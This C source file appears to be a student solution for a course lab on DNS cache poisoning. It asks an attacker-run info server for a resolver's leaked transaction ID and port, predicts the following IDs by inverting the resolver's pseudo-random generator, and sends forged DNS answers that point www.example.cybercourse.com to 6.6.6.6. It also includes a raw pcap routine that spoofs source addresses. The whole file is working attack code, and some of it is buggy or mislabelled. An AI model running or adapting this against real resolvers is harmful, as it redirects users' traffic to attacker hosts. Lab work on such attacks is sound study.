#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define SPOOFED_SOURCE_IP  "192.168.1.207"
#define DNS_SERVER_IP "192.168.1.203" // Google's public DNS server
#define DNS_SERVER_PORT 53      // Standard DNS port
#define BUFFER_SIZE 512         // Buffer size for the DNS query and response
#define INFO_SERVER_IP "192.168.1.201" // Server providing initial information
#define INFO_SERVER_PORT 4444          // Port for receiving info
#define TAP1 0x80000057
#define TAP2 0x80000062


int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid);

int build_dns_response(unsigned char *buffer, unsigned char *query, int query_len, uint32_t txid);
#define SPOOFED_IP "6.6.6.6"
#define RESOLVER_IP "192.168.1.203"
#define DNS_QUERY_NAME "www.example.cybercourse.com"

// DNS header structure
struct dns_header {
    uint16_t id;       // Transaction ID
    uint16_t flags;    // Flags
    uint16_t q_count;  // Number of questions
    uint16_t ans_count; // Number of answers
    uint16_t auth_count; // Number of authoritative records
    uint16_t add_count;  // Number of additional records
};

// DNS question structure
struct dns_question {
    uint16_t qtype;  // Type (A = 1)
    uint16_t qclass; // Class (IN = 1)
};

// DNS answer structure
struct dns_answer {
    uint16_t name;    // Pointer to query name
    uint16_t type;    // Type (A = 1)
    uint16_t class;   // Class (IN = 1)
    uint32_t ttl;     // Time to live
    uint16_t rdlength; // Length of rdata
    uint32_t rdata;   // The spoofed IP address
};


// Function to encode domain name into DNS format
void encode_domain_name(unsigned char *dns, const char *host) {
    int lock = 0;
    strcat((char *)dns, ".");
    for (int i = 0; i < (int) strlen(host); i++) {
        if (host[i] == '.') {
            *dns++ = i - lock;
            for (; lock < i; lock++) {
                *dns++ = host[lock];
            }
            lock++; // Skip the '.'
        }
    }
    *dns++ = '\0';
}

void send_spoofed_packet(const char *resolver_ip, int resolver_port, const char *query_name, uint16_t txid) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live failed: %s\n", errbuf);
        exit(1);
    }

    // Allocate space for the packet
    unsigned char packet[512];
    memset(packet, 0, sizeof(packet));

    // Build the IP header
    struct ip *ip_hdr = (struct ip *) packet;
    ip_hdr->ip_hl = 5; // Header length
    ip_hdr->ip_v = 4; // IPv4
    ip_hdr->ip_tos = 0;
    ip_hdr->ip_len = htons(sizeof(struct ip) + sizeof(struct udphdr) + 512); // Total length
    ip_hdr->ip_id = htons(54321);
    ip_hdr->ip_off = 0;
    ip_hdr->ip_ttl = 64;
    ip_hdr->ip_p = IPPROTO_UDP;
    ip_hdr->ip_src.s_addr = inet_addr(SPOOFED_IP); // Spoofed source IP
    ip_hdr->ip_dst.s_addr = inet_addr(resolver_ip); // Target resolver IP

    // Build the UDP header
    struct udphdr *udp_hdr = (struct udphdr *) (packet + sizeof(struct ip));
    udp_hdr->uh_sport = htons(53); // Spoofed source port
    udp_hdr->uh_dport = htons(resolver_port); // Target resolver port
    udp_hdr->uh_ulen = htons(sizeof(struct udphdr) + 512); // UDP length

    // Build the DNS header
    unsigned char *dns_data = packet + sizeof(struct ip) + sizeof(struct udphdr);
    struct dns_header *dns_hdr = (struct dns_header *) dns_data;
    dns_hdr->id = htons(txid);
    dns_hdr->flags = htons(0x8180); // Response flag, authoritative answer
    dns_hdr->q_count = htons(1);   // One question
    dns_hdr->ans_count = htons(1); // One answer
    dns_hdr->auth_count = 0;
    dns_hdr->add_count = 0;

    // Add the question section
    unsigned char *query = dns_data + sizeof(struct dns_header);
    encode_domain_name(query, query_name);
    struct dns_question *dns_q = (struct dns_question *)(query + strlen((const char *)query) + 1);
    dns_q->qtype = htons(1);  // A record
    dns_q->qclass = htons(1); // IN class

    // Add the answer section
    struct dns_answer *dns_a = (struct dns_answer *)(query + strlen((const char *)query) + 1 + sizeof(struct dns_question));
    dns_a->name = htons(0xc00c); // Pointer to the query name
    dns_a->type = htons(1);      // A record
    dns_a->class = htons(1);     // IN class
    dns_a->ttl = htonl(3600);    // TTL
    dns_a->rdlength = htons(4);  // Length of IP address
    dns_a->rdata = inet_addr(SPOOFED_IP); // Spoofed IP address

    // Send the packet
    int packet_size = sizeof(struct ip) + sizeof(struct udphdr) + sizeof(struct dns_header) +
                      strlen((const char *)query) + 1 + sizeof(struct dns_question) + sizeof(struct dns_answer);
    if (pcap_inject(handle, packet, packet_size) == -1) {
        fprintf(stderr, "Failed to send packet: %s\n", pcap_geterr(handle));
    } else {
        printf("Spoofed packet sent!\n");
    }

    // Clean up
    pcap_close(handle);
}






// Structure for DNS header and response construction
int build_dns_response(unsigned char *buffer, unsigned char *query, int query_len, uint32_t txid) {
    int response_len = 0;

    // DNS Header (same as the query but with a different txid and response flags)
    uint32_t txid_network = htons(txid); 
    unsigned short flags = htons(0x8180);  // Standard query response, no error
    unsigned short q_count = htons(1);     // 1 question
    unsigned short ans_count = htons(1);   // 1 answer
    unsigned short auth_count = 0;
    unsigned short add_count = 0;

    // Copy the query into the buffer
    memcpy(buffer, query, query_len);
    response_len = query_len;

    // Header section for response
    memcpy(buffer + response_len, &txid_network, 2);
    response_len += 2;
    memcpy(buffer + response_len, &flags, 2);
    response_len += 2;
    memcpy(buffer + response_len, &q_count, 2);
    response_len += 2;
    memcpy(buffer + response_len, &ans_count, 2);
    response_len += 2;
    memcpy(buffer + response_len, &auth_count, 2);
    response_len += 2;
    memcpy(buffer + response_len, &add_count, 2);
    response_len += 2;

    // Copy the question section as is (hostname format and type)
    // This is the same question section as in the query, no changes
    memcpy(buffer + response_len, (query + 12), query_len - 12);
    response_len += query_len - 12;

    // Answer section: Hostname -> A record (IP: 6.6.6.6)
    unsigned short type = htons(1);  // Type A (IPv4 address)
    unsigned short _class = htons(1); // Class IN (Internet)
    unsigned int ttl = htonl(3000);    // Time-to-live: 300 seconds
    unsigned short data_len = htons(4); // Length of the IP address

    // A record data (IP address 6.6.6.6)
    unsigned char ip_address[] = { 6, 6, 6, 6 };

    // Write answer
    memcpy(buffer + response_len, &type, 2);
    response_len += 2;
    memcpy(buffer + response_len, &_class, 2);
    response_len += 2;
    memcpy(buffer + response_len, &ttl, 4);
    response_len += 4;
    memcpy(buffer + response_len, &data_len, 2);
    response_len += 2;
    memcpy(buffer + response_len, ip_address, 4);
    response_len += 4;

    return response_len;
}

// Function to send the spoofed DNS response
void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *destination_ip, int destination_port, uint32_t qtxid) {
    int sockfd;
    struct sockaddr_in server_addr;
    unsigned char buffer[BUFFER_SIZE];

    // Step 1: Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Step 2: Configure the server address for sending the spoofed response
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(destination_port);
    inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);

    // struct iphdr *iph = (struct iphdr *)buffer;
    // iph->saddr = inet_addr("192.168.1.207"); // Source IP

    // Step 3: Assume we already have the DNS query (this would normally come from the client)
    unsigned char query[BUFFER_SIZE];
    int query_len = build_dns_query(query, hostname, qtxid);  
    printf("query_len: %d\n", query_len);
    // Step 4: Build the DNS response
    int response_len = build_dns_response(buffer, query, query_len, txid);
    printf("response_len: %d\n", response_len);
    printf("query: %s\n", query);
    printf("destination_ip: %s\n", destination_ip);
    
    // Step 5: Send the spoofed DNS response
    if (sendto(sockfd, buffer, response_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to send spoofed DNS response");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Spoofed DNS response sent for hostname: %s with IP: 6.6.6.6\n", hostname);
    close(sockfd);
}

// Function to fill the txid_ls with the 10 possible txid
void fill_txids(uint32_t *txid_ls, uint32_t txid){
    // if the LSbit of r_1 = LSbit r_2 = 0 
    txid_ls[8] = txid >> 1;
    // set the left most bit of txid_ls[0] to 1, txid is 16 bits
    txid_ls[9] = (txid >> 1) | (1<<15);

    // else if the LSbit of r_1 = LSbit r_2 = 1
    for (int i = 0; i < 4; i ++) {
        txid_ls[i] = ((((txid >> 1) ^ TAP1 ^ TAP2) >> 1) ^ TAP1 ^ TAP2) | (i<<14);
    }
    
    for (int i = 0; i < 4; i ++) {
        txid_ls[4 + i] = (((txid >> 1) ^ TAP1 ^ TAP2) >> 1) | (i<<14);
    }
}
    
int socket_creation(struct sockaddr_in *server_addr){
    // Create a socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Configure the server address
    printf("configure the server address \n");
    memset(server_addr, 0, sizeof(*server_addr));
    (*server_addr).sin_family = AF_INET;
    (*server_addr).sin_port = htons(INFO_SERVER_PORT);
    inet_pton(AF_INET, INFO_SERVER_IP, &server_addr->sin_addr);

    // Connect to the server
    printf("connect to the server\n");
    if (connect(sockfd, (struct sockaddr *)server_addr, sizeof(*server_addr)) < 0) {
        perror("Connection to info server failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    return sockfd;
}

// Function to communicate with the info server and get the txid
void run_attack(uint32_t *txid_ls) {
    // connect to server attacker
    int sockfd1;
    struct sockaddr_in server_addr1;
    char txid_buffer[BUFFER_SIZE];
    uint32_t txid = 0;
    unsigned int source_port = 0;

    sockfd1 = socket_creation(&server_addr1);
    
    printf("Attacker server connected: %s:%d\n", inet_ntoa(server_addr1.sin_addr), ntohs(server_addr1.sin_port));
    
    // send the DNS request  ################ step 1 #####################
    const char *hostname = "www.attacker.cybercourse.com";
    int sockfd;
    struct sockaddr_in server_addr;
    unsigned char buffer[BUFFER_SIZE];

    // Step 1: Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    // Step 2: Configure the DNS server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DNS_SERVER_PORT);
    inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);
    printf("step 2 done\n");
    // Step 3: Build the DNS query
    int query_len = build_dns_query(buffer, hostname, 1234);
    printf("step 3 done\n");
    printf("buffer: %s\n", buffer);
    // Step 4: Send the DNS query
    if (sendto(sockfd, buffer, query_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to send DNS query");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("DNS query sent for hostname: %s\n", hostname);
    printf("waiting for txid\n");
    // Receive the txid from the server
    int bytes_received = recv(sockfd1, txid_buffer, BUFFER_SIZE - 1, 0); // fix this
    if (bytes_received < 0) {
        perror("Failed to receive data from info server");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    txid_buffer[bytes_received] = '\0'; // Null-terminate the received string
    printf("Received from server: %s\n", txid_buffer);

    // Parse the txid
    if (sscanf(txid_buffer, "TXID: %u, PORT: %u", &txid, &source_port) != 2) {
        fprintf(stderr, "Failed to parse TXID from server response\n");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Extracted TXID: %u\n", txid);
    printf("source port : %u\n", source_port);
    fill_txids(txid_ls, txid);
    for (int i = 0; i < 10; i++) {
        send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i]);
        // full_spoofed_answer(txid_ls[i], source_port);
        // send_spoofed_packet(RESOLVER_IP, source_port, DNS_QUERY_NAME, txid_ls[i]);
    }
    
    // Close the connection
    close(sockfd);
    close(sockfd1);
}


// Function to build a DNS query
int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid) {
    int query_len = 0;
    uint32_t txid = htons(tid); // Transaction ID
    unsigned short flags = htons(0x0100); // Standard query
    unsigned short q_count = htons(1);   // 1 question
    unsigned short ans_count = 0;        // No answers
    unsigned short auth_count = 0;       // No authority
    unsigned short add_count = 0;        // No additional

    // Header section
    memcpy(buffer + query_len, &txid, 2);
    query_len += 2;
    memcpy(buffer + query_len, &flags, 2);
    query_len += 2;
    memcpy(buffer + query_len, &q_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &ans_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &auth_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &add_count, 2);
    query_len += 2;
    printf("got here \n");
    // Question section (convert hostname to DNS format)
    char buffer2[512];
    strcpy(buffer2, hostname);
    const char *token = strtok((char *)buffer2, ".");
    printf("got here \n");
    while (token) {
        size_t len = strlen(token);
        buffer[query_len++] = (unsigned char)len;
        memcpy(buffer + query_len, token, len);
        query_len += len;
        token = strtok(NULL, ".");
    }

    buffer[query_len++] = 0; // End of hostname

    // Question Type (A record)
    unsigned short qtype = htons(1); // Type A
    memcpy(buffer + query_len, &qtype, 2);
    query_len += 2;

    // Question Class (IN)
    unsigned short qclass = htons(1); // Class IN
    memcpy(buffer + query_len, &qclass, 2);
    query_len += 2;

    return query_len;
}

int main() {
    uint32_t txid[10];

    // Step 1: Get the TXID from the info server
    run_attack(txid);


    return 0;
}
